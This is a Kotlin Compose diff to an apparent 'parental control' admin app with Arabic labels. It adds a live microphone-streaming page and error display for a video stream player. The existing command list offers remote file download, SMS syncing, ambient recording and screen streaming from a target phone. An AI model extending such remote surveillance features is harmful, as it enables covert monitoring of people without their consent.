@@ -38,6 +38,7 @@ import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
+import androidx.compose.ui.draw.scale
 import androidx.compose.ui.graphics.Brush
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.asImageBitmap
@@ -2053,6 +2054,7 @@ fun DeviceCommandsTab(
             val cmdItems = listOf(
                 CommandItemInfo("media_gallery", "معرض الوسائط والملفات", "استعراض الصور، الفيديوهات والتسجيلات المكتشفة", Icons.Default.PhotoLibrary, Color(0xFF3F51B5)),
                 CommandItemInfo("audio_record", "تسجيل الصوت المحيطي", "تسجيل مقطع صوتي محيطي بالوقت الحقيقي والاستماع إليه", Icons.Default.Mic, Color(0xFF00E5FF)),
+                CommandItemInfo("mic_stream", "بث الميكروفون المباشر", "الاستماع لميكروفون هاتف الطفل بالوقت الحقيقي بصوت نقي", Icons.Default.RecordVoiceOver, Color(0xFFEF4444)),
                 CommandItemInfo("file_explorer", "مستكشف ملفات الهاتف", "استكشاف وتنزيل ملفات جهاز الطفل بالكامل", Icons.Default.FolderOpen, Color(0xFFFFD54F)),
                 CommandItemInfo("apps", "قائمة التطبيقات وحزمها", "الاطلاع وفلترة التطبيقات المنصبة على الهاتف للأمان", Icons.Default.Apps, Color(0xFFFF4081)),
                 CommandItemInfo("sms", "الرسائل وتنبيهات الأمان", "مزامنة الرسائل النصية والتنبيهات المكتشفة بالهاتف", Icons.Default.Sms, Color(0xFFFF9100)),
@@ -2105,6 +2107,7 @@ fun DeviceCommandsTab(
                     "screenshot" -> ScreenshotRequirementsPage(viewModel)
                     "media_gallery" -> DeviceMediaGalleryTab(viewModel)
                     "audio_record" -> AudioRecordRequirementsPage(viewModel)
+                    "mic_stream" -> MicStreamRequirementsPage(viewModel)
                     "live_stream" -> LiveStreamRequirementsPage(viewModel)
                     "file_explorer" -> RemoteFileExplorerTab(viewModel)
                     "apps" -> InstalledAppsRequirementsPage(viewModel)
@@ -2416,6 +2419,171 @@ fun BentoMediaGrid(
                             
                             OutlinedButton(onClick = { showOptions = false }, modifier = Modifier.fillMaxWidth()) {
                                 Text("إلغاء", color = Color(0xFF1F2937))
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+@Composable
+fun MicStreamRequirementsPage(viewModel: AdminViewModel) {
+    val micStreamState by viewModel.micStreamState.collectAsState()
+    
+    val isActive = micStreamState.isActive
+    val isLoading = micStreamState.isLoading
+
+    // Pulse animation when active
+    val infiniteTransition = rememberInfiniteTransition(label = "micPulse")
+    val pulseScale by infiniteTransition.animateFloat(
+        initialValue = 1f,
+        targetValue = if (isActive || isLoading) 1.2f else 1f,
+        animationSpec = infiniteRepeatable(
+            animation = tween(1000, easing = LinearEasing),
+            repeatMode = RepeatMode.Reverse
+        ),
+        label = "micPulseScale"
+    )
+
+    val pulseAlpha by infiniteTransition.animateFloat(
+        initialValue = 0.5f,
+        targetValue = if (isActive || isLoading) 0f else 0.5f,
+        animationSpec = infiniteRepeatable(
+            animation = tween(1000, easing = LinearEasing),
+            repeatMode = RepeatMode.Restart
+        ),
+        label = "micPulseAlpha"
+    )
+
+    LazyColumn(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(Color(0xFF0B0F19))
+            .padding(16.dp),
+        verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
+        item {
+            Card(
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
+                border = BorderStroke(1.dp, Color(0xFF334155)),
+                shape = RoundedCornerShape(24.dp),
+                modifier = Modifier.fillMaxWidth()
+            ) {
+                Column(
+                    modifier = Modifier.padding(24.dp),
+                    horizontalAlignment = Alignment.CenterHorizontally
+                ) {
+                    Box(
+                        modifier = Modifier
+                            .size(100.dp)
+                            .padding(8.dp),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        if (isActive || isLoading) {
+                            Box(
+                                modifier = Modifier
+                                    .fillMaxSize()
+                                    .scale(pulseScale)
+                                    .background(Color(0xFFEF4444).copy(alpha = pulseAlpha), CircleShape)
+                            )
+                        }
+                        Box(
+                            modifier = Modifier
+                                .size(64.dp)
+                                .background(if (isActive) Color(0xFFEF4444) else Color(0xFF334155), CircleShape),
+                            contentAlignment = Alignment.Center
+                        ) {
+                            Icon(
+                                imageVector = Icons.Default.Mic,
+                                contentDescription = null,
+                                tint = Color.White,
+                                modifier = Modifier.size(32.dp)
+                            )
+                        }
+                    }
+                    Spacer(Modifier.height(16.dp))
+                    Text(
+                        text = "بث الميكروفون الحي",
+                        color = Color.White,
+                        fontSize = 20.sp,
+                        fontWeight = FontWeight.Bold
+                    )
+                    Spacer(Modifier.height(8.dp))
+                    Text(
+                        text = "يتيح لك هذا الخيار الاستماع لما يدور حول هاتف الطفل في الوقت الفعلي وبجودة عالية عبر بث مباشر للصوت.",
+                        color = Color(0xFF94A3B8),
+                        fontSize = 13.sp,
+                        textAlign = TextAlign.Center,
+                        lineHeight = 20.sp,
+                        modifier = Modifier.padding(horizontal = 12.dp)
+                    )
+                    Spacer(Modifier.height(24.dp))
+                    
+                    if (isActive) {
+                        Card(
+                            colors = CardDefaults.cardColors(containerColor = Color(0xFF166534).copy(alpha = 0.2f)),
+                            border = BorderStroke(1.dp, Color(0xFF166534)),
+                            shape = RoundedCornerShape(12.dp),
+                            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp)
+                        ) {
+                            Row(
+                                modifier = Modifier.padding(12.dp),
+                                verticalAlignment = Alignment.CenterVertically,
+                                horizontalArrangement = Arrangement.Center
+                            ) {
+                                Box(modifier = Modifier.size(8.dp).background(Color(0xFF22C55E), CircleShape))
+                                Spacer(Modifier.width(8.dp))
+                                Text("البث المباشر المفتوح يعمل الآن", color = Color(0xFF22C55E), fontSize = 13.sp, fontWeight = FontWeight.SemiBold)
+                            }
+                        }
+
+                        Button(
+                            onClick = { viewModel.stopMicStream() },
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFEF4444)),
+                            shape = RoundedCornerShape(14.dp),
+                            modifier = Modifier.fillMaxWidth().height(52.dp)
+                        ) {
+                            Icon(Icons.Default.Stop, null, tint = Color.White)
+                            Spacer(Modifier.width(8.dp))
+                            Text("إيقاف البث الحي", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                        }
+                    } else {
+                        Button(
+                            onClick = { viewModel.startMicStream() },
+                            enabled = !isLoading,
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6)),
+                            shape = RoundedCornerShape(14.dp),
+                            modifier = Modifier.fillMaxWidth().height(52.dp)
+                        ) {
+                            if (isLoading) {
+                                CircularProgressIndicator(color = Color.White, modifier = Modifier.size(20.dp), strokeWidth = 2.dp)
+                                Spacer(Modifier.width(8.dp))
+                                Text("جاري الاتصال...", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                            } else {
+                                Icon(Icons.Default.PlayArrow, null, tint = Color.White)
+                                Spacer(Modifier.width(8.dp))
+                                Text("بدء الاستماع الآن", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                            }
+                        }
+                    }
+                    
+                    if (micStreamState.error != null) {
+                        Spacer(modifier = Modifier.height(16.dp))
+                        Card(
+                            colors = CardDefaults.cardColors(containerColor = Color(0xFF7F1D1D).copy(alpha = 0.2f)),
+                            border = BorderStroke(1.dp, Color(0xFF7F1D1D)),
+                            shape = RoundedCornerShape(12.dp),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Row(
+                                modifier = Modifier.padding(12.dp),
+                                verticalAlignment = Alignment.CenterVertically
+                            ) {
+                                Icon(Icons.Default.ErrorOutline, null, tint = Color(0xFFFCA5A5), modifier = Modifier.size(16.dp))
+                                Spacer(Modifier.width(8.dp))
+                                Text(text = micStreamState.error!!, color = Color(0xFFFCA5A5), fontSize = 12.sp)
                             }
                         }
                     }
@@ -5663,8 +5831,10 @@ fun LiveStreamPlayer(
         }
         mutableStateOf(type)
     }
+    
+    var nativeErrorMessage by remember { mutableStateOf<String?>(null) }
 
-    Box(modifier = modifier.background(Color.Black)) {
+    Box(modifier = modifier.background(Color.Black), contentAlignment = Alignment.Center) {
         if (playerType == "native" && frameFlow != null) {
             AndroidView(
                 factory = { ctx ->
@@ -5679,6 +5849,7 @@ fun LiveStreamPlayer(
                                     val format = android.media.MediaFormat.createVideoFormat("video/avc", 320, 576)
                                     codec?.configure(format, holder.surface, null, 0)
                                     codec?.start()
+                                    nativeErrorMessage = null
                                     
                                     job = kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                                         frameFlow.collect { frameBytes ->
@@ -5699,11 +5870,15 @@ fun LiveStreamPlayer(
                                                 }
                                             } catch (e: Exception) {
                                                 android.util.Log.e("NativeH264Player", "Error decoding", e)
+                                                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                                    nativeErrorMessage = "Error decoding frame: ${e.message}"
+                                                }
                                             }
                                         }
                                     }
                                 } catch (e: Exception) {
                                     android.util.Log.e("NativeH264Player", "Error initializing codec", e)
+                                    nativeErrorMessage = "Error initializing codec: ${e.message}"
                                 }
                             }
 
@@ -5723,6 +5898,20 @@ fun LiveStreamPlayer(
                 },
                 modifier = Modifier.fillMaxSize()
             )
+            
+            if (nativeErrorMessage != null) {
+                Card(
+                    modifier = Modifier.padding(16.dp),
+                    colors = CardDefaults.cardColors(containerColor = Color(0xFFEF4444).copy(alpha = 0.9f))
+                ) {
+                    Text(
+                        text = nativeErrorMessage ?: "",
+                        color = Color.White,
+                        fontSize = 12.sp,
+                        modifier = Modifier.padding(12.dp)
+                    )
+                }
+            }
         } else if (playerType == "web" || (playerType == "native" && frameFlow == null)) {
             val encodedUrl = remember(streamUrl, deviceToken) {
                 try {
